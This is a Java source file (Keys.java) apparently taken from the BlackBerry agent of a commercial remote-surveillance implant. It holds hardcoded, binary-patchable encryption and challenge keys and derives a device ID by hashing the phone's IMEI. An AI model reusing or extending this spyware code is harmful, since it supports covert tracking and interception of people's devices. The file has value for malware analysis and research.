/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Keys.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.config;

import net.rim.device.api.system.GPRSInfo;
import blackberry.crypto.Encryption;
import blackberry.interfaces.Singleton;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Keys.
 */
public final class Keys implements Singleton {
    private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
    private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // markup,
    // logjava
    private static String instanceID = "bg5etG87q20Kg52W5Fg1";
    private static String buildID = "av3pVck1gb4eR2d8";

    private static String challenge = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
    private static String confName = "c3mdX053du1YJ541vqWILrc4Ff71pViL"; // wchar

    private static byte[] byteAesKey;
    private static byte[] byteChallengeKey;
    private static byte[] byteConfKey;
    private static byte[] byteConfNameKey;
    private static byte[] byteInstanceID;

    static Keys instance = null;

    /**
     * Gets the single instance of Keys.
     * 
     * @return single instance of Keys
     */
    public static synchronized Keys getInstance() {
        if (instance == null) {
            instance = new Keys();
        }

        return instance;
    };

    /**
     * Checks for been binary patched.
     * 
     * @return true, if successful
     */
    public static boolean hasBeenBinaryPatched() {
        return !buildID.equals("av3pVck1gb4eR2d8");
    }

    private Keys() {
        final byte[] imei = GPRSInfo.getIMEI();
        byteInstanceID = Encryption.SHA1(imei);
        instanceID = Utils.byteArrayToHex(byteInstanceID);
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getAesKey() {
        if (byteAesKey == null) {
            byteAesKey = keyFromString(aes);
        }
        return byteAesKey;
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildId() {
        return buildID.getBytes();
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getChallengeKey() {
        if (byteChallengeKey == null) {
            byteChallengeKey = keyFromString(challenge);
        }

        return byteChallengeKey;
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        if (byteConfKey == null) {
            byteConfKey = keyFromString(conf);
        }

        return byteConfKey;
    }

    /**
     * Gets the conf name key.
     * 
     * @return the conf name key
     */
    public byte[] getConfNameKey() {
        if (byteConfNameKey == null) {
            byteConfNameKey = keyFromString(confName);
        }

        return byteConfNameKey;
    }

    /**
     * Gets the instance id.
     * 
     * @return the instance id
     */
    public byte[] getInstanceId() {

        return byteInstanceID;
    }

    private byte[] keyFromString(final String string) {
        final byte[] key = new byte[16];
        Utils.copy(key, 0, string.getBytes(), 0, 16);
        return key;
    }

    /**
     * Sets the aes key.
     * 
     * @param key
     *            the new aes key
     */
    public void setAesKey(final byte[] key) {
        byteAesKey = key;
    }

    /**
     * Sets the builds the id.
     * 
     * @param build
     *            the new builds the id
     */
    public void setBuildID(final String build) {
        buildID = build;
    }

    /**
     * Sets the challenge key.
     * 
     * @param challenge_
     *            the new challenge key
     */
    public void setChallengeKey(final byte[] challenge_) {
        byteChallengeKey = challenge_;
    }

    /**
     * Sets the conf key.
     * 
     * @param conf_
     *            the new conf key
     */
    public void setConfKey(final byte[] conf_) {
        byteConfKey = conf_;
    }

}
